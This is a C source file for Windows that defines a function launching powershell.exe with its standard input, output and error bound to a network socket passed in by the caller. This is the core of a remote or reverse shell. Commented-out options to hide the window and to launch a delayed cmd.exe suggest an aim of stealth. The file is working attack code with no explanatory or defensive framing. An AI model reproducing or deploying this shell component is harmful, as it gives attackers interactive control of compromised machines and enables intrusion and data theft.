#include "Process.h"

PPROCESS_INFORMATION CreateChildProcess(
    SOCKET ConnectSocket
) {
    TCHAR szCmdline[] = 
        TEXT("powershell.exe");
    //TEXT("powershell.exe -c \"sleep 10; cmd.exe\"");
    PPROCESS_INFORMATION piProcInfo = (PPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION));
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    // Set up members of the PROCESS_INFORMATION structure. 
    if (!piProcInfo) {
        return NULL;
    }
    ZeroMemory(piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    //siStartInfo.wShowWindow = SW_HIDE;
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = (HANDLE)ConnectSocket;
    siStartInfo.hStdOutput = (HANDLE)ConnectSocket;
    siStartInfo.hStdInput = (HANDLE)ConnectSocket;
    //siStartInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    siStartInfo.dwFlags = (STARTF_USESTDHANDLES);

    // Create the child process. 

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        piProcInfo);  // receives PROCESS_INFORMATION 

     // If an error occurs, exit the application. 
    if (!bSuccess) {
        LPVOID lpMsgBuf;
        DWORD dw = GetLastError();

        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER |
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL,
            dw,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&lpMsgBuf,
            0, NULL);

        printf("CreateProcess failed with error %d", dw);

        LocalFree(lpMsgBuf);
        return NULL;
    }
    else
    {
        return piProcInfo;
    }
}